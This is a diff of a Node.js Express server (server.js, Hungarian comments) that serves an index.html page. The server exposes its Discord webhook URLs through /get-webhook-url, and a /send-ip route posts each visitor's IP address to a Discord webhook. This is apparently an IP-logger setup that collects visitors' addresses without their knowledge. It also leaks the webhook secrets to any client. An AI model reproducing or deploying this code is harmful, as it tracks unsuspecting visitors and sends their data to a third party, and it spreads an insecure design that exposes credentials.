@@ -1,5 +1,3 @@
-// server.js
-
 const express = require('express');
 const axios = require('axios');
 require('dotenv').config();
@@ -7,15 +5,20 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// Statikus fájlok
+// Statikus fájlok kiszolgálása (CSS, JS, stb.)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook URL-k és IPINFO token a .env fájlból
+// Webhook URL és IPINFO token a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
 
-// /get-webhook-url útvonal a webhook URL-k elküldéséhez
+// Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
+});
+
+// /get-webhook-url útvonal a webhook URL-ek elküldéséhez
 app.get('/get-webhook-url', (req, res) => {
     res.json({ webhookUrl, altWebhookUrl });
 });
@@ -41,7 +44,7 @@ app.get('/send-ip', async (req, res) => {
             }]
         };
 
-        await axios.post(webhookUrl, message);
+        await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
         res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
         console.error('Hiba:', error.message);
